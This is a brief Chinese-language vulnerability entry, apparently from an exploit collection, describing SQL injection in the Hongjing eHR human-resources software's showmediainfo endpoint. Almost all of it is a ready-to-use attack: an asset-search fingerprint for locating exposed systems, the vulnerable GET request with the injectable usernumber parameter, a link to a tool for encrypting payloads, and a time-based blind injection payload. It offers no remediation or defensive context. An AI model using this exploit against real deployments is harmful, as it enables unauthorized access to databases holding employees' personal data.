# 宏景eHR人力资源管理软件showmediainfo存在SQL注入漏洞

宏景eHR人力资源管理软件 ｜ SQL注入 ｜ —
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`GET /workbench/duty/showmediainfo?kind=0&usernumber=[加密后的恶意SQL]&planid=1&objectid=1 HTTP/1.1`

**Payload**
```
加密工具：[https://github.com/vaycore/HrmsTool/releases/tag/0.1](https://github.com/vaycore/HrmsTool/releases/tag/0.1)
java -jar HrmsTool.jar -e "1';waitfor delay '0:0:5'--"
```